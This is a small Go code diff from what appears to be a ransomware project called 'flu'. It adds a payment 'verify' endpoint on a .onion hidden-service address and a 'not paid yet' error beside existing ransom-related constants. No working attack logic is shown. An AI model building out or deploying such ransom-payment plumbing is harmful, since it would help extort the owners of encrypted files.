@@ -30,6 +30,7 @@ var (
 const (
     hiddenServiceBase   = "http://64mdqdzcrf2u7tklmngd6ob7ki6gnlokfyjctpj6p6bmdfnhisib3xid.onion"
     hiddenServiceOracle = hiddenServiceBase + "/oracle"
+    hiddenServiceVerify = hiddenServiceBase + "/verify/"
 
     magicBytes = "JUSTA FLU BRO :)"
 
@@ -40,4 +41,5 @@ var (
     errNotFullWrite = errors.New(pkg, "failed to write all data")
     errNotFluFile   = errors.New(pkg, "not a flu file")
     errNotAdmin     = errors.New(pkg, "user is not admin")
+    errNotPaid      = errors.New(pkg, "not paid yet")
 )
